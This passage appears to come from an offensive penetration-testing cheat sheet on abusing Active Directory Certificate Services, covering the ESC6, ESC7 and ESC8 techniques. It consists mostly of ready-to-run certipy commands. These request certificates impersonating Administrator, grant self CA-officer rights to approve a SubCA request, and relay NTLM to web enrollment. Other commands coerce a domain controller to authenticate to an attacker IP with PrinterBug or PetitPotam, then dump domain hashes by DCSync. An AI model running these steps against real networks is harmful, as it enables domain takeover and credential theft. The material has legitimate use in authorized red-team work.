certipy req -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -target <CA_FQDN> -ca '<CA_Name>' -template '<target_template>' -upn Administrator@<Domain>
```

#### certipy | Step 3 — Restore the original template
```
certipy template -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -target <CA_FQDN> -template '<target_template>' -configuration <saved_template>.json
```

#### certipy | Step 4 — Get NT hash
```
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 (CA-WIDE SAN)
<!-- id: adcs-esc6 -->

> If the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled, any template with Client Authentication EKU allows the requester to supply an arbitrary SAN — even templates not explicitly misconfigured for ESC1. This is a CA-level flag that affects all templates at once.

### Check if CA flag is set

#### certipy | Check CA configuration
```
certipy find -u <user>@<Domain> -p <pass> -dc-ip <DC_IP>
# Look for: EDITF_ATTRIBUTESUBJECTALTNAME2 in CA flags
```

#### cmd | Check on Windows with certutil
```
certutil -config "<CA_FQDN>\<CA_Name>" -getreg policy\EditFlags
# Flag value includes EDITF_ATTRIBUTESUBJECTALTNAME2 (0x00040000)
```

### Exploit

#### certipy | Request cert as Administrator using any Client Auth template
```
certipy req -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -target <CA_FQDN> -ca '<CA_Name>' -template 'User' -upn Administrator@<Domain>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

## ESC7 — CA ACL ABUSE (MANAGE CA / MANAGE CERTIFICATES)
<!-- id: adcs-esc7 -->

> If your user has "Manage CA" rights, you can grant yourself "Issue and Manage Certificates" rights, which lets you approve failed certificate requests. This lets you request the SubCA template (normally admin-only), approve your own request, and get a CA-level certificate.

### Requirements
- User has ManageCA or ManageCertificates right on the CA

### Exploit

#### certipy | Step 1 — Grant yourself Manage Certificates right
```
certipy ca -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -ca '<CA_Name>' -add-officer <user>
```

#### certipy | Step 2 — Request SubCA certificate (will fail — save the private key)
```
certipy req -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -target <CA_FQDN> -ca '<CA_Name>' -template SubCA -upn Administrator@<Domain>
# Note the Request ID from the failed request
```

#### certipy | Step 3 — Approve your own request
```
certipy ca -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -ca '<CA_Name>' -issue-request <request_ID>
```

#### certipy | Step 4 — Retrieve the issued certificate
```
certipy req -u <user>@<Domain> -p <pass> -dc-ip <DC_IP> -target <CA_FQDN> -ca '<CA_Name>' -retrieve <request_ID>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

## ESC8 — NTLM RELAY TO WEB ENROLLMENT
<!-- id: adcs-esc8 -->

> If the CA has Web Enrollment enabled (HTTP endpoint at /certsrv) without HTTPS or EPA (Extended Protection for Authentication), you can relay NTLM authentication to it and request a certificate as the relayed account. Relay a DC's machine account to get a DC certificate and then DCSync the domain.

### Requirements
- CA has Web Enrollment role enabled
- Web Enrollment is on HTTP (not HTTPS) or lacks EPA

### Exploit

#### certipy | Run relay listener targeting CA Web Enrollment
```
certipy relay -target http://<CA_FQDN>/certsrv/certfnsh.asp -ca '<CA_Name>'
```

#### bash | Trigger NTLM authentication from DC (Printer Bug / coercion)
```
# In another terminal — coerce DC to authenticate to your machine:
python3 printerbug.py <Domain>/<user>:<pass>@<DC_FQDN> <attacker_IP>
# or use PetitPotam:
python3 PetitPotam.py -u <user> -p <pass> -d <Domain> <attacker_IP> <DC_FQDN>
```

#### certipy | Authenticate with the DC certificate to get domain hashes
```
certipy auth -pfx dc.pfx -dc-ip <DC_IP>
# Then DCSync with the TGT or NT hash:
impacket-secretsdump -k -no-pass <DC_FQDN> -just-dc
```

> Note: If HTTPS is enforced, try with certipy relay -target https:// and check for ESC11 (RPC relay) as an alternative.
